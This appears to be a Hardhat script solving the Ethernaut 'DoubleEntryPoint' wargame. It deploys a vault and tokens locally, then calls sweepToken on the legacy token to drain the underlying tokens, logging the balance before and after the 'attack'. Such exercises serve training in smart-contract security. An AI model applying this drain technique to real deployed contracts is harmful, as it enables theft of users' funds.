const {
    network,
    ethers
} = require("hardhat");
const hre = require("hardhat");

async function main() {
    const [deployer, user] = await ethers.getSigners()
    const deployerAddr = await deployer.getAddress()
    const userAddr = await user.getAddress()
    console.log("deployer address = ", deployerAddr, "user address = ", userAddr)

    // deplay the contract
    const fortaContract = await ethers.deployContract("Forta")
    const fortaAddr = await fortaContract.getAddress()
    console.log("forta contract address = ", fortaAddr)

    const legacyTokenContract = await ethers.deployContract("LegacyToken")
    const legacyTokenAddr = await legacyTokenContract.getAddress()
    console.log("legacy token address = ", legacyTokenAddr)

    const cryptoVaultContract = await ethers.deployContract("CryptoVault", [deployerAddr])
    const cryptoVaultAddr = await cryptoVaultContract.getAddress()
    console.log("crypto vault address = ", cryptoVaultAddr)

    const doubleEntryPointContract = await ethers.deployContract("DoubleEntryPoint", [legacyTokenAddr, cryptoVaultAddr, fortaAddr, deployerAddr])
    const doubleEntryPointAddr = await doubleEntryPointContract.getAddress()
    console.log("double entry point address = ", doubleEntryPointAddr)

    //
    legacyTokenContract.mint(cryptoVaultAddr, ethers.parseEther("100.0"))
    legacyTokenContract.delegateToNewContract(doubleEntryPointAddr)
    cryptoVaultContract.setUnderlying(doubleEntryPointAddr)

    {
        // status before attack
        const vaultBalance = await doubleEntryPointContract.balanceOf(cryptoVaultAddr)
        console.log("vault balance = ", vaultBalance)
    }

    //
    const attackTx = await cryptoVaultContract.sweepToken(legacyTokenAddr)
    await ethers.provider.getTransactionReceipt(attackTx.hash).then((receipt) => {
        console.log("tx receipt = ", receipt)
    })

    {
        // status after attack
        const vaultBalance = await doubleEntryPointContract.balanceOf(cryptoVaultAddr)
        console.log("vault balance = ", vaultBalance)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});